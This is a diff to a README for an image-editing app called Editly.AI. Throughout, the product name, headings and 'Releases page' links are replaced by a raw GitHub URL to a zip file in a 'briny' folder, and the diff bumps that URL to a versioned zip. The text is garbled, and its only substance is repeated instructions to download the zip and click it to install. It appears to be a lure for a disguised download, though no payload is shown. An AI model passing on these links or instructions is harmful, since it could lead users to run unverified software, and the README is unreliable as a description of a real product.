@@ -1,16 +1,16 @@
-# 🌟 https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip - Simple Tools for Stunning Images
+# 🌟 https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip - Simple Tools for Stunning Images
 
 ## 🚀 Getting Started
 
-Welcome to https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip! This powerful image editor uses the latest technology to help you enhance and transform your photos easily. Follow these steps to get started.
+Welcome to https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip! This powerful image editor uses the latest technology to help you enhance and transform your photos easily. Follow these steps to get started.
 
-## 📥 Download https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip
+## 📥 Download https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip
 
-[![Download https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip](https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip)](https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip)
+[![Download https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip](https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip)](https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip)
 
 ## 🛠️ System Requirements
 
-To use https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip, your computer should meet the following requirements:
+To use https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip, your computer should meet the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.12 or later
 - **RAM:** Minimum 4 GB, recommended 8 GB
@@ -24,15 +24,15 @@ To use https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Edi
 - **Customizable Tools:** Fine-tune images with various editing options.
 - **Export Options:** Save images in multiple formats for your needs.
 
-## 📚 How to Use https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip
+## 📚 How to Use https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip
 
 1. **Install the Application:**
-   - Visit the [Releases page](https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip) to download the application.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip) to download the application.
    - Locate the latest version. Click on the link to download the installer file.
    - Once downloaded, click the file to start the installation process.
 
-2. **Run https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip**
-   - After installation, find https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip in your Applications or Programs folder.
+2. **Run https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip**
+   - After installation, find https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip in your Applications or Programs folder.
    - Click the app icon to open it.
 
 3. **Editing Images:**
@@ -50,11 +50,11 @@ To use https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Edi
 
 ## 📂 Download & Install
 
-To download https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip, simply [visit this page](https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip). Look for the latest version and click on the file to download. Follow the installation instructions mentioned above to get started.
+To download https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip, simply [visit this page](https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip). Look for the latest version and click on the file to download. Follow the installation instructions mentioned above to get started.
 
 ## 🛡️ Support and Feedback
 
-If you encounter any issues or have questions, feel free to reach out through the support section on our GitHub page. We are dedicated to helping you make the most out of https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip
+If you encounter any issues or have questions, feel free to reach out through the support section on our GitHub page. We are dedicated to helping you make the most out of https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip
 
 ## 📝 Contributing
 
@@ -76,4 +76,4 @@ We welcome contributions from all users. If you have ideas or improvements, plea
 - tailwindcss-v4
 - typescript
 
-Thank you for choosing https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly.AI.zip! Happy editing!
+Thank you for choosing https://raw.githubusercontent.com/Eduardojose520/Editly.AI/main/briny/Editly_AI_v1.9.zip! Happy editing!
